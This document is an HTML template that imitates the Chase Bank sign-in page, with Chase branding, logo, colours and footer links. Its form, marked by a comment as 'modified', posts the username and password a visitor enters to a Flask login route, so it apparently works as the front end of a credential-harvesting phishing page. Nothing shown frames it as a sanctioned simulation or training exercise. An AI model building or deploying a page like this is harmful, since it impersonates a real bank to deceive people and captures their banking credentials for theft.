<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Chase Bank</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: #0a2540; /* Chase Signature Navy Backdrop */
            background-image: radial-gradient(circle at 50% 30%, #103860 0%, #0a2540 70%);
            color: #1d252c;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            min-height: 100vh;
            padding: 40px 20px 24px;
        }

        .login-card {
            background-color: #ffffff;
            width: 100%;
            max-width: 420px;
            border-radius: 12px;
            padding: 40px 36px 36px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Chase Octagon SVG Logo */
        .logo-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 12px;
            margin-bottom: 28px;
        }

        .chase-logo {
            width: 52px;
            height: 52px;
        }

        .brand-name {
            font-size: 22px;
            font-weight: 700;
            letter-spacing: 2.5px;
            color: #1170cf;
            text-transform: uppercase;
        }

        /* Form Controls */
        .login-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .input-group {
            position: relative;
            width: 100%;
        }

        .input-field {
            width: 100%;
            height: 52px;
            padding: 20px 16px 6px;
            background-color: #ffffff;
            border: 1px solid #717d8a;
            border-radius: 6px;
            font-size: 16px;
            outline: none;
            color: #1d252c;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .input-field:focus {
            border-color: #1170cf;
            box-shadow: 0 0 0 2px rgba(17, 112, 207, 0.2);
        }

        .input-label {
            position: absolute;
            left: 16px;
            top: 16px;
            font-size: 15px;
            color: #5c6773;
            pointer-events: none;
            transition: all 0.15s ease;
        }

        .input-field:focus ~ .input-label,
        .input-field:not(:placeholder-shown) ~ .input-label {
            top: 6px;
            font-size: 11px;
            color: #1170cf;
            font-weight: 600;
        }

        .input-field:not(:focus):not(:placeholder-shown) ~ .input-label {
            color: #5c6773;
        }

        .eye-btn {
            position: absolute;
            right: 14px;
            top: 16px;
            background: none;
            border: none;
            cursor: pointer;
            color: #5c6773;
            display: flex;
            align-items: center;
        }

        /* Checkbox & Options */
        .options-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            font-size: 14px;
            margin-top: -4px;
        }

        .remember-me {
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
            color: #36414c;
            user-select: none;
        }

        .remember-me input[type="checkbox"] {
            width: 18px;
            height: 18px;
            accent-color: #1170cf;
            cursor: pointer;
        }

        .forgot-link {
            font-size: 14px;
            font-weight: 600;
            color: #1170cf;
            text-decoration: none;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        /* Submit Button */
        .btn-primary {
            width: 100%;
            height: 48px;
            background-color: #1170cf;
            border: none;
            border-radius: 6px;
            color: #ffffff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s, transform 0.1s;
            margin-top: 8px;
        }

        .btn-primary:hover {
            background-color: #0d5bb0;
        }

        .btn-primary:active {
            transform: scale(0.99);
        }

        .divider {
            width: 100%;
            height: 1px;
            background-color: #e1e5eb;
            margin: 24px 0 20px;
        }

        /* Bottom Signup Link */
        .signup-container {
            text-align: center;
            font-size: 14px;
            color: #5c6773;
        }

        .signup-container a {
            color: #1170cf;
            font-weight: 600;
            text-decoration: none;
        }

        .signup-container a:hover {
            text-decoration: underline;
        }

        /* Footer */
        .footer-links {
            display: flex;
            gap: 20px;
            font-size: 12px;
            color: #a0aec0;
            margin-top: 32px;
            flex-wrap: wrap;
            justify-content: center;
        }

        .footer-links a {
            color: #cbd5e0;
            text-decoration: none;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <main class="login-card">
        <!-- Official Chase Octagon Logo -->
        <div class="logo-container">
            <svg class="chase-logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path fill="#1170CF" d="M60.6 0H13.8L0 13.8v46.8l13.8-13.8V13.8h33L60.6 0zM100 39.4v46.8L86.2 100H39.4l13.8-13.8h33V53.2L100 39.4zM39.4 100h46.8l13.8-13.8V39.4l-13.8 13.8v33h-33L39.4 100zM0 60.6V13.8L13.8 0h46.8L46.8 13.8h-33v33L0 60.6z"/>
            </svg>
            <span class="brand-name">CHASE</span>
        </div>

        <!-- MODIFIED FORM: action points to Flask route, POST method, inputs have names -->
        <form class="login-form" id="login-form" action="{{ url_for('login') }}" method="POST">
            <div class="input-group">
                <input type="text" id="username" name="username" class="input-field" placeholder=" " required autofocus />
                <label for="username" class="input-label">Username</label>
            </div>

            <div class="input-group">
                <input type="password" id="password" name="password" class="input-field" placeholder=" " required />
                <label for="password" class="input-label">Password</label>
                <button type="button" class="eye-btn" id="toggle-pwd" aria-label="Toggle password visibility">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                        <circle cx="12" cy="12" r="3"></circle>
                    </svg>
                </button>
            </div>

            <div class="options-row">
                <label class="remember-me">
                    <input type="checkbox" id="remember-me" />
                    <span>Remember me</span>
                </label>
                <a href="#" class="forgot-link">Forgot?</a>
            </div>

            <button type="submit" class="btn-primary">Sign in</button>

            <div class="divider"></div>

            <div class="signup-container">
                Not Enrolled? <a href="#">Sign up now</a>
            </div>
        </form>
    </main>

    <footer class="footer-links">
        <a href="#">Contact us</a>
        <a href="#">Privacy</a>
        <a href="#">Security</a>
        <a href="#">Terms of use</a>
        <a href="#">Member FDIC</a>
    </footer>

    <script>
        const passwordInput = document.getElementById('password');
        const togglePwd = document.getElementById('toggle-pwd');

        // Password Visibility Toggle
        togglePwd.addEventListener('click', () => {
            const isPassword = passwordInput.getAttribute('type') === 'password';
            passwordInput.setAttribute('type', isPassword ? 'text' : 'password');
        });
    </script>

</body>
</html>
